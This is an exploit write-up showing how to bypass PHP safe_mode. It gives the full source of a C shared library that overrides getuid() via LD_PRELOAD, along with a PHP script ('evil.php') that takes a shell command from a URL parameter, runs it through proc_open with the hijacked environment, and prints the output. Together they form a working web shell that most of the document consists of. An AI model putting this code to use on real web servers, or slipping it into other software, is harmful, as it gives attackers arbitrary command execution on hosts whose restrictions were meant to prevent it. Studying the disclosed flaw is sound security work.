PHP safe_mode bypass via proc_open() and custom environment

+ safe-bypass-procopen.txt - yet another way to bypass PHP safe_mode. +

This *should* work provided that you have met the following requirements:

1) A writable directory under documentroot to place those files (obviously)
2) You don&#039;t have proc_open in your disabled_functions list
3) You are able to compile a shared library on the same platform as the target web server.


The reason I&#039;m publishing that is because I posted a similar bug (putenv()+mail()) which was titled as "Bogus" one by the PHP developers.

Now, this one uses quite the same concept, only different means.


How does this work?
-------------------


You&#039;ll need to change the $path variable to match the writable directory


Here is the library code, compile with cc -o a.so -fPIC -shared a.c

a.c:
----

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int getuid()
{
char *en;
char *buf=malloc(300);
FILE *a;

unsetenv("LD_PRELOAD");
a=fopen(".comm","r");
buf=fgets(buf,100,a);
write(2,buf,strlen(buf));
fclose(a);
rename("a.so","b.so");
system(buf);
system("mv output.txt .comm1");
rename("b.so","a.so");
free(buf);
return 0;
}

*cut*



And that is the PHP script:

evil.php:
-------------------------
<?php

$path="/var/www"; //change to your writable path


$a=fopen($path."/.comm","w");
fputs($a,$_GET["c"]);
fclose($a);

$descriptorspec = array(
 0 => array("pipe", "r"),
 1 => array("file", $path."/output.txt","w"),
 2 => array("file", $path."/errors.txt", "a" )
);

$cwd = &#039;.&#039;;
$env = array(&#039;LD_PRELOAD&#039; => $path."/a.so");
$process = proc_open(&#039;id > /tmp/a&#039;, $descriptorspec, $pipes, $cwd, $env); // example command - should not succeed


sleep(1);
$a=fopen($path."/.comm1","r");

while (!feof($a))
{$b=fgets($a);echo $b;}
fclose($a);

?>

*cut*





Why does that work?
-------------------

Because the PHP devs like to trust the environment. Especially the dynamic loader variables. In the original bug I posted into their bugtracking system, I suggested that they clean them in mail() for example, but....yuck the bug was classified as *bogus*.


/bin/sh loads your h4h0r library and then BOOM!


I hope you&#039;d find that useful.


BTW....!!! Dolu naglite programisti :DDD !!!
